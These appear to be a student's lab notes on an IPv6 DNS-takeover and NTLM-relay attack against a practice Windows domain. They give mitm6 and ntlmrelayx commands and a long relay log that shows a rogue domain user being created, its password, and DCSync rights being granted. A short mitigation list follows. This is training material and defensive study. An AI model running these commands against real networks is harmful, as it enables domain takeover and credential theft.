**IPV6 Attacks**

<br/>
Alternate to relaying SMB<br/>
<br/>
uses IPV6<br/>
<br/>
typical windows runs on IPV4<br/>
<br/>
IPV6 can be turned on but not used<br/>
<br/>
DNS is not being conducted<br/>
<br/>
So we can spoof the IPV6 DNS server<br/>
<br/>
we can trickt he machine to use us to gain access<br/>
<br/>
we can then use the NTLM hash to create a new account for us as the attacker<br/>
<br/>
attack is still prominiate in wild and hard to detect<br/>
<br/>
<br/>
<br/>
<br/>
ATTACK<br/>
<br/>
install mitm6<br/>
<br/>
https://github.com/dirkjanm/mitm6<br/>
<br/>
Ensure server has CA<br/>
<br/>
<br/>
<br/>
To start set up mitm6<br/>
<br/>
syntax &gt; sudo mitm6 -d marvel.local <br/>
<br/>
Will start receiveing traffic from deivces in the network<br/>
<br/>
<br/>
<img height="200" src="image.png" width="681"/><br/>
<br/>
<br/>
now start relay as before but for IPV6<br/>
<br/>
sudo impacket-ntlmrelayx -6 -t ldaps://192.168.247.133 -wh fakewpad.marvel.local -l lootme<br/>
<br/>
now the system is waiting for a IPV6 call.. its about once every 30min.. for learning to speed up we can just restart the machine<br/>
<br/>
<img height="250" src="image 2.png" width="513"/><br/>
<br/>
<img height="450" src="image 3.png" width="589"/><br/>
<br/>
captured data saved in 'lootme' folder<br/>
<br/>
──(kali㉿kali)-[~/lootme]<br/>
└─$ firefox domain_users_by_group.html <br/>
<br/>
<img src="image 4.png"/><br/>
<br/>
<br/>
<br/>
<img src="image 5.png"/><br/>
<br/>
<br/>
<br/>
Now fun part...<br/>
<br/>
log intoa a machine as admin<br/>
<br/>
ntlmreplayx creates a new user<br/>
<br/>
<br/>
ACE<br/>
AceType: {0}<br/>
AceFlags: {0}<br/>
AceSize: {36}<br/>
AceLen: {32}<br/>
<br/>
Ace:{<br/>
<br/>
  Mask:{<br/>
    Mask: {983551}<br/>
  }<br/>
<br/>
  Sid:{<br/>
    Revision: {1}<br/>
    SubAuthorityCount: {5}<br/>
<br/>
    IdentifierAuthority:{<br/>
      Value: {b'\x00\x00\x00\x00\x00\x05'}<br/>
    }<br/>
    SubLen: {20}<br/>
    SubAuthority: {b'\x15\x00\x00\x00&gt;\xbeUU\xaf\xee7\xf2$\x1e\x9a\xde\x00\x02\x00\x00'}<br/>
  }<br/>
}<br/>
TypeName: {'ACCESS_ALLOWED_ACE'}<br/>
<br/>
ACE<br/>
AceType: {0}<br/>
AceFlags: {18}<br/>
AceSize: {36}<br/>
AceLen: {32}<br/>
<br/>
Ace:{<br/>
<br/>
  Mask:{<br/>
    Mask: {983551}<br/>
  }<br/>
<br/>
  Sid:{<br/>
    Revision: {1}<br/>
    SubAuthorityCount: {5}<br/>
<br/>
    IdentifierAuthority:{<br/>
      Value: {b'\x00\x00\x00\x00\x00\x05'}<br/>
    }<br/>
    SubLen: {20}<br/>
    SubAuthority: {b'\x15\x00\x00\x00&gt;\xbeUU\xaf\xee7\xf2$\x1e\x9a\xde\x07\x02\x00\x00'}<br/>
  }<br/>
}<br/>
TypeName: {'ACCESS_ALLOWED_ACE'}<br/>
<br/>
ACE<br/>
AceType: {0}<br/>
AceFlags: {18}<br/>
AceSize: {36}<br/>
AceLen: {32}<br/>
<br/>
Ace:{<br/>
<br/>
  Mask:{<br/>
    Mask: {983551}<br/>
  }<br/>
<br/>
  Sid:{<br/>
    Revision: {1}<br/>
    SubAuthorityCount: {5}<br/>
<br/>
    IdentifierAuthority:{<br/>
      Value: {b'\x00\x00\x00\x00\x00\x05'}<br/>
    }<br/>
    SubLen: {20}<br/>
    SubAuthority: {b'\x15\x00\x00\x00&gt;\xbeUU\xaf\xee7\xf2$\x1e\x9a\xde\x07\x02\x00\x00'}<br/>
  }<br/>
}<br/>
TypeName: {'ACCESS_ALLOWED_ACE'}<br/>
<br/>
ACE<br/>
AceType: {0}<br/>
AceFlags: {2}<br/>
AceSize: {36}<br/>
AceLen: {32}<br/>
<br/>
Ace:{<br/>
<br/>
  Mask:{<br/>
    Mask: {983551}<br/>
  }<br/>
<br/>
  Sid:{<br/>
    Revision: {1}<br/>
    SubAuthorityCount: {5}<br/>
<br/>
    IdentifierAuthority:{<br/>
      Value: {b'\x00\x00\x00\x00\x00\x05'}<br/>
    }<br/>
    SubLen: {20}<br/>
    SubAuthority: {b'\x15\x00\x00\x00&gt;\xbeUU\xaf\xee7\xf2$\x1e\x9a\xde\x07\x02\x00\x00'}<br/>
  }<br/>
}<br/>
TypeName: {'ACCESS_ALLOWED_ACE'}<br/>
<br/>
ACE<br/>
AceType: {0}<br/>
AceFlags: {18}<br/>
AceSize: {36}<br/>
AceLen: {32}<br/>
<br/>
Ace:{<br/>
<br/>
  Mask:{<br/>
    Mask: {983551}<br/>
  }<br/>
<br/>
  Sid:{<br/>
    Revision: {1}<br/>
    SubAuthorityCount: {5}<br/>
<br/>
    IdentifierAuthority:{<br/>
      Value: {b'\x00\x00\x00\x00\x00\x05'}<br/>
    }<br/>
    SubLen: {20}<br/>
    SubAuthority: {b'\x15\x00\x00\x00&gt;\xbeUU\xaf\xee7\xf2$\x1e\x9a\xde\x07\x02\x00\x00'}<br/>
  }<br/>
}<br/>
TypeName: {'ACCESS_ALLOWED_ACE'}<br/>
<b>[*] User privileges found: Create user<br/>
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)<br/>
[*] User privileges found: Modifying domain ACL<br/>
[*] Attempting to create user in: CN=Users,DC=MARVEL,DC=local<br/>
</b><b>[*] Adding new user with username: fCbvpBvkqG and password: 6^K`@U3,)&quot;w.K5&quot; result: OK</b><br/>
[*] Querying domain security descriptor<br/>
[*] Success! User fCbvpBvkqG now has Replication-Get-Changes-All privileges on the domain<br/>
[*] Try using DCSync with secretsdump.py and this user :)<br/>
[*] Saved restore state to aclpwn-20220215-080056.restore<br/>
[-] New user already added. Refusing to add another<br/>
[-] Unable to escalate without a valid user, aborting.<br/>
[*] HTTPD: Received connection from ::ffff:192.168.247.135, attacking target ldaps://192.168.247.133<br/>
[*] HTTPD: Client requested path: www.bing.com:443<br/>
[*] HTTPD: Received connection from ::ffff:192.168.247.135, attacking target ldaps://192.168.247.133<br/>
[*] HTTPD: Client requested path: www.bing.com:443<br/>
[*] HTTPD: Received connection from ::ffff:192.168.247.135, attacking target ldaps://192.168.247.133<br/>
[*] HTTPD: Client requested path: www.bing.com:443<br/>
[-] Exception in HTTP request handler: 'NoneType' object has no attribute 'sendAuth'<br/>
[*] HTTPD: Received connection from ::ffff:192.168.247.135, attacking target ldaps://192.168.247.133<br/>
[*] HTTPD: Client requested path: login.live.com:443<br/>
[*] HTTPD: Received connection from ::ffff:192.168.247.135, attacking target ldaps://192.168.247.133<br/>
[*] HTTPD: Client requested path: login.live.com:443<br/>
[*] HTTPD: Client requested path: login.live.com:443<br/>
[*] Authenticating against ldaps://192.168.247.133 as MARVEL\Administrator SUCCEED<br/>
[*] Enumerating relayed user's privileges. This may take a while on large domains<br/>
<br/>
ACE<br/>
AceType: {0}<br/>
AceFlags: {0}<br/>
AceSize: {36}<br/>
AceLen: {32}<br/>
<br/>
Ace:{<br/>
<br/>
  Mask:{<br/>
    Mask: {983551}<br/>
  }<br/>
<br/>
  Sid:{<br/>
    Revision: {1}<br/>
    SubAuthorityCount: {5}<br/>
<br/>
    IdentifierAuthority:{<br/>
      Value: {b'\x00\x00\x00\x00\x00\x05'}<br/>
    }<br/>
    SubLen: {20}<br/>
    SubAuthority: {b'\x15\x00\x00\x00&gt;\xbeUU\xaf\xee7\xf2$\x1e\x9a\xde\x00\x02\x00\x00'}<br/>
  }<br/>
}<br/>
TypeName: {'ACCESS_ALLOWED_ACE'}<br/>
<br/>
ACE<br/>
AceType: {0}<br/>
AceFlags: {18}<br/>
AceSize: {36}<br/>
AceLen: {32}<br/>
<br/>
Ace:{<br/>
<br/>
  Mask:{<br/>
    Mask: {983551}<br/>
  }<br/>
<br/>
  Sid:{<br/>
    Revision: {1}<br/>
    SubAuthorityCount: {5}<br/>
<br/>
    IdentifierAuthority:{<br/>
      Value: {b'\x00\x00\x00\x00\x00\x05'}<br/>
    }<br/>
    SubLen: {20}<br/>
    SubAuthority: {b'\x15\x00\x00\x00&gt;\xbeUU\xaf\xee7\xf2$\x1e\x9a\xde\x07\x02\x00\x00'}<br/>
  }<br/>
}<br/>
TypeName: {'ACCESS_ALLOWED_ACE'}<br/>
<br/>
ACE<br/>
AceType: {0}<br/>
AceFlags: {18}<br/>
AceSize: {36}<br/>
AceLen: {32}<br/>
<br/>
Ace:{<br/>
<br/>
  Mask:{<br/>
    Mask: {983551}<br/>
  }<br/>
<br/>
  Sid:{<br/>
    Revision: {1}<br/>
    SubAuthorityCount: {5}<br/>
<br/>
    IdentifierAuthority:{<br/>
      Value: {b'\x00\x00\x00\x00\x00\x05'}<br/>
    }<br/>
    SubLen: {20}<br/>
    SubAuthority: {b'\x15\x00\x00\x00&gt;\xbeUU\xaf\xee7\xf2$\x1e\x9a\xde\x07\x02\x00\x00'}<br/>
  }<br/>
}<br/>
TypeName: {'ACCESS_ALLOWED_ACE'}<br/>
<br/>
ACE<br/>
AceType: {0}<br/>
AceFlags: {2}<br/>
AceSize: {36}<br/>
AceLen: {32}<br/>
<br/>
Ace:{<br/>
<br/>
  Mask:{<br/>
    Mask: {983551}<br/>
  }<br/>
<br/>
  Sid:{<br/>
    Revision: {1}<br/>
    SubAuthorityCount: {5}<br/>
<br/>
    IdentifierAuthority:{<br/>
      Value: {b'\x00\x00\x00\x00\x00\x05'}<br/>
    }<br/>
    SubLen: {20}<br/>
    SubAuthority: {b'\x15\x00\x00\x00&gt;\xbeUU\xaf\xee7\xf2$\x1e\x9a\xde\x07\x02\x00\x00'}<br/>
  }<br/>
}<br/>
TypeName: {'ACCESS_ALLOWED_ACE'}<br/>
<br/>
ACE<br/>
AceType: {0}<br/>
AceFlags: {18}<br/>
AceSize: {36}<br/>
AceLen: {32}<br/>
<br/>
Ace:{<br/>
<br/>
  Mask:{<br/>
    Mask: {983551}<br/>
  }<br/>
<br/>
  Sid:{<br/>
    Revision: {1}<br/>
    SubAuthorityCount: {5}<br/>
<br/>
    IdentifierAuthority:{<br/>
      Value: {b'\x00\x00\x00\x00\x00\x05'}<br/>
    }<br/>
    SubLen: {20}<br/>
    SubAuthority: {b'\x15\x00\x00\x00&gt;\xbeUU\xaf\xee7\xf2$\x1e\x9a\xde\x07\x02\x00\x00'}<br/>
  }<br/>
}<br/>
TypeName: {'ACCESS_ALLOWED_ACE'}<br/>
<b>[*] User privileges found: Create user<br/>
</b><b>[*] User privileges found: Adding user to a privileged group (Enterprise Admins)</b><br/>
[*] User privileges found: Modifying domain ACL<br/>
[-] New user already added. Refusing to add another<br/>
[-] Unable to escalate without a valid user.<br/>
[-] New user already added. Refusing to add another<br/>
[-] Unable to escalate without a valid user, aborting.<br/>
^C                    <br/>
<br/>
<br/>
<b>Adding new user with username: fCbvpBvkqG and password: 6^K`@U3,)&quot;w.K5&quot;</b><br/>
<br/>
<img height="400" src="image 6.png" width="564"/><br/>
<br/>
my new user account<br/>
<br/>
<br/>
further reading<br/>
https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/<br/>
https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/<br/>
<br/>
<br/>
<br/>
DEFENSE<br/>
<br/>
in IPV4 only environment.. maybe disable IPV6<br/>
<br/>
can cause issues soo have block rules<br/>
<br/>
if WPAD not used.. diable in policy<br/>
<br/>
LDAP and LDAPS can be mitegated by enabling both LDAP signing and LDAP channel binding<br/>
<br/>
move admin users to protected users group<br/>
<br/>
<br/>
